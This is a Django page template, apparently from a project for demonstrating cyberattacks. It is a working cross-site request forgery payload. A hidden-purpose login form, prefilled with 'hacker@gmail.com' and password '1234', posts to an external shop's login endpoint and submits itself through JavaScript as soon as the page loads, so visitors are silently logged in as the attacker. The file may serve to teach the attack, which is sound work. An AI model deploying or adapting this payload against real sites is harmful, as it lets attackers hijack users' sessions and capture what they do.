{% extends 'firstcyberattacksapp/basic.html' %}
{% load static %}
{% block title %}

{% endblock %}
{% block css %}


{% endblock %}

{% block body %}

<div class="container">
<form id="loginform" class="px-4 py-3" method="post" action="https://ecommerce-mac.herokuapp.com/shop/handleLoginEmail/" id="loginform">{% csrf_token %}
    <div class="form-group">
        <label for="loginemail">Email</label>
        <input type="email" class="form-control" id="loginemail" value="hacker@gmail.com" name="loginemail"
            placeholder="Enter Your Email" required>
    </div>
    <div class="form-group">
        <label for="loginpass">Password</label>
        <input type="password" class="form-control" id="loginpass" value="1234" name="loginpass"
            placeholder="Password" required>
    </div>
    <div>
        If new user then<span>
            <button type="button" class="btn btn-link" data-toggle="modal"
                data-target="#signupModal" data-dismiss="modal"><u>Sign Up</u></button></span>
    </div>
    <div class="form-group">
        <div class="form-check">
            <input type="checkbox" class="form-check-input" id="dropdownCheck">
            <label class="form-check-label" for="dropdownCheck">
                Remember me
            </label>
        </div>
    </div>
    <button type="submit" id="loginbutton" class="btn btn-primary">Sign in</button>
</form>
</div>
{% endblock %}
{% block js %}
<script>
document.getElementById("loginform").submit();
</script>
{% endblock %}
